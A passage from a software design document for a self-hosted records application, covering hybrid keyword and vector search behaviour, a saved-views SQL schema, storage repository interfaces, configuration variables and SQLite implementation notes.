   at least one arm's raw pool was full, widen both pools once to `16 x limit` and retry, then
   return whatever survives. The one rule covers filter selectivity, soft-deleted rows, and
   multi-chunk crowding alike; type scoping does not starve anything, because both arms scope
   before their limits.
5. **Hit source, snippet, and `other_matches` are keyword-first.** A record's hit source is its
   best keyword-arm source when it has one, with FTS5 `snippet()` and `<em>` markers; otherwise
   it is the source of the record's nearest chunk, with the leading 240 characters of that chunk
   and the query's literal content terms `<em>`-wrapped where they occur. `other_matches` counts
   the record's *additional* keyword-arm sources (a field or a comment each count once; several
   chunks of one field are one location) and is 0 for a semantic-only hit. Counting vector-pool
   locations instead was rejected because the count would then depend on which unrelated chunks
   happened to land in the pool. `title` is the type's display field value, or the record key
   when that is empty.
6. **Every response carries `index_lag: {pending_jobs, failed_jobs}`** (pending counts
   `pending` plus `running`) and `mode_applied`, which differs from the requested `mode` only when
   semantic search is disabled and `hybrid` degraded to keyword-only. With embedding disabled,
   `mode=semantic` and the re-index trigger are refused with `feature_disabled` (HTTP 409,
   DD-34), never `validation_failed`.
7. **Edge cases.** An empty or whitespace query is `validation_failed`; a query whose keyword
   phrases are all dropped runs the semantic arm alone in `hybrid` and returns no results in
   `keyword`; queries are capped at 1,000 characters; `object_types: []` is the same as omitted;
   `limit` defaults to 10 and is capped at 50, with no cursor (DD-40).

## 11. Saved views

```sql
CREATE TABLE saved_views (
  id             TEXT PRIMARY KEY,
  object_type_id TEXT NOT NULL REFERENCES object_types(id),
  name           TEXT NOT NULL,
  description    TEXT,
  mode           TEXT NOT NULL DEFAULT 'table',  -- 'table' | 'card'
  config         TEXT NOT NULL,                  -- JSON: filter, sort, group_by, columns, widths
  is_default     INTEGER NOT NULL DEFAULT 0,
  created_at     TEXT NOT NULL,
  created_by     TEXT NOT NULL REFERENCES principals(id),
  updated_at     TEXT NOT NULL,
  updated_by     TEXT NOT NULL REFERENCES principals(id)
);
CREATE UNIQUE INDEX ix_views_default
  ON saved_views(object_type_id) WHERE is_default = 1;
```

All views are shared and visible to all members at MVP (see PRD open items).

## 12. Storage abstraction

Repository interfaces the service layer depends on. One SQLite implementation; no second driver
until it is actually needed (DD-2).

```
SchemaRepository      object types, fields, proposals
RecordRepository      records, query execution, links, version checks
CommentRepository     comments
AuditRepository       append events, query history, change feed
SearchRepository      embeddings, vector search, FTS (fusion is in the service layer, DD-33)
BlobRepository        attachment bytes
SavedViewRepository   saved views (FR-U3)
GrantRepository       object_type_grants (DD-11)
RecordAttachmentRepository  record_attachments, the attachment reverse index
```

`GrantRepository` is the only module allowed to name `object_type_grants` in SQL, by the same
argument that keeps `vec0` inside `SearchRepository`: migrating that table stays a one-module
change. A test walks `src/` and asserts it, and a second asserts that the *decision* is made only
in `AccessService` and never in a route handler or an MCP tool (DD-3, DD-11).

`SearchRepository` has an **indexing** half: keyword row replacement and deletion per
source, a row-preserving embedding sync, purge by field and by object type, the durable queue
(enqueue, claim with the backoff predicate, reclaim, complete, fail), counts, the failed-job list,
the stale-chunk count, and a read-back of a source's rows including their stored vectors. It
also has a **retrieval** half: `keyword_search` (the constructed FTS5 query, scoped and live-joined
before its limit, returning sources, rank order, and `snippet()`) and `vector_search` (a
partition-constrained KNN over `vec_embeddings`, joined the same way, returning the live sources
with `chunk_text` and distance plus the pre-join KNN row count), and `enqueue_all`, the bulk
enqueue behind the re-index trigger. Its SQLite
implementation is the only module that names `vec0`, `vec_embeddings`, `fts_content`, `MATCH`,
`snippet(`, or `bm25(`, which is what keeps migrating off either index a one-module change (PRD
DD-2); a test walks `src/` and asserts it.

Portability constraints to honor so a Postgres driver stays a bounded project:

- Query construction goes through a filter-AST compiler, not string interpolation. Only that
  compiler knows about `json_extract` versus JSONB `->>`.
- No SQLite-specific behavior leaks above the repository layer, including implicit type affinity.
- Timestamps are ISO-8601 UTC strings everywhere, so the port does not hinge on date types.
- `AUTOINCREMENT` cursors are treated as opaque monotonic tokens by callers, never as counts.

## 13. Configuration

| Variable | Default | Purpose |
| --- | --- | --- |
| `GW_DATA_DIR` | `/data` | Volume root: database (which holds the vector index) and attachments |
| `GW_AUTH_MODE` | `standalone` | `standalone`, `oidc`, or `both` |
| `GW_OIDC_ISSUER` | | Okta issuer URL |
| `GW_OIDC_CLIENT_ID` | | |
| `GW_OIDC_CLIENT_SECRET` | | |
| `GW_OIDC_ADMIN_GROUPS` | | Comma-separated Okta groups mapped to the admin role |
| `GW_OIDC_CREATOR_GROUPS` | | Comma-separated Okta groups mapped to the creator role. Matched against the same `GW_OIDC_GROUP_CLAIM`; admin wins when an identity is in both. Unset maps nobody, so a deployment that never sets it is unchanged |
| `GW_BOOTSTRAP_ADMIN_EMAIL` | | Created on first run in standalone mode |
| `GW_EMBEDDING_MODEL` | `bge-small-en-v1.5` | Bundled model identifier: the subdirectory of `GW_MODEL_DIR` holding `model.onnx` and `tokenizer.json` |
| `GW_MODEL_DIR` | `/app/models` | Where the image baked the model (DD-32). Never fetched at runtime; startup fails fast naming this variable if the files are missing while embedding is enabled |
| `GW_EMBEDDING_ENABLED` | `true` | When false: no worker, writes enqueue nothing, FTS still maintained, `mode=keyword` works, `mode=semantic` and the re-index trigger are `feature_disabled` (409, DD-34), `mode=hybrid` degrades to keyword with `mode_applied: "keyword"`; re-enabling requires an admin re-index (DD-34) |
| `GW_MAX_ATTACHMENT_BYTES` | `26214400` | Per-file attachment cap, enforced in `AttachmentService` (DD-18) |
| `GW_MAX_REQUEST_BYTES` | `4194304` | Maximum request body on `/api/` **and** on `/mcp`: one setting governs both surfaces so a 413 cannot differ between them (DD-18). 4 MiB is the MCP SDK's default, which the transport already enforced silently. The attachment upload and the CSV import are exempt and enforce their own, larger ceilings |
| `GW_MAX_CSV_IMPORT_BYTES` | `26214400` | CSV import byte ceiling, refused before any row is parsed |
| `GW_MAX_CSV_IMPORT_ROWS` | `20000` | CSV import row ceiling, refused before any row is parsed |
| `GW_MAX_CSV_EXPORT_ROWS` | `100000` | CSV export row ceiling. Export streams, so this bounds work rather than memory; over it is a refusal naming the variable, never a **silent truncation** |
| `GW_BASE_URL` | | Public URL; required when `GW_AUTH_MODE` is `oidc` or `both` (the OIDC `redirect_uri`) |
| `GW_LOG_LEVEL` | `info` | |
| `GW_COOKIE_SECURE` | `true` | `Secure` attribute on the session cookie (DD-9) |
| `GW_SESSION_LIFETIME_HOURS` | `12` | Absolute session lifetime (DD-9) |
| `GW_SESSION_IDLE_HOURS` | `8` | Idle session lifetime, since `last_seen_at` (DD-9) |
| `GW_TRUSTED_PROXY_IPS` | `127.0.0.1` | Proxies uvicorn honors forwarded headers from (FR-P7) |

**What `GW_EMBEDDING_ENABLED=false` does not turn off.** The flag
governs the model and the worker, not the storage layer. Migration 6 creates `vec_embeddings`
through the numbered runner, which runs unconditionally, so **sqlite-vec loads on every connection
and its startup check fails fast on every deployment**, disabled or not. A deployment that turns
embedding off because it cannot run the model still cannot start without a loadable-extension
build of SQLite, and every existing test acquires that dependency even while staying model-free
(no test acquires a *model* dependency from this). FTS5 availability is checked on the same
unconditional path. Consequently `stale_chunks` on `GET /api/v1/admin/search-index`, defined as
rows whose `model_id` differs from the current provider's, has no provider to compare against when
embedding is disabled: it is then computed against the configured `GW_EMBEDDING_MODEL` name, and
`embedding_model` in the response reports that configured value with `semantic_enabled: false`,
rather than returning null and making the field's type conditional.

## 14. Implementation notes

- Enable SQLite WAL mode, `foreign_keys = ON`, and a busy timeout. WAL matters because the
  embedding worker writes concurrently with request handlers.
- Wrap each request's writes in one transaction so record change, link change, comment counter,
  audit rows, FTS update, and job enqueue commit atomically.
- A grant change and its audit row commit in that same one-transaction shape (DD-11):
  `AccessService.grant` and `revoke` each open one `db.write()` block and perform the
  `object_type_grants` write and the `entity_type = 'object_type_grant'` audit append on the same
  connection, so a grant is never visible without the audit row that explains who made it, or the
  reverse. `record_attachments` is maintained inside the same transaction as the `records.data`
  write it reflects: `RecordService._sync_attachment_refs` runs on the connection `create_record`,
  `update_record`, and `bulk_update` already hold, not as a follow-up write, so the reverse index
  can never observably lag the field value it authorizes reads against.
- Validate every `data` document against its object type's field definitions on write. Reject
  unknown keys rather than silently storing them; an agent sending a misspelled field key should
  get an error naming the valid keys.
- Do not pin dependency versions from memory. Verify current stable releases before pinning
  (DD-5).
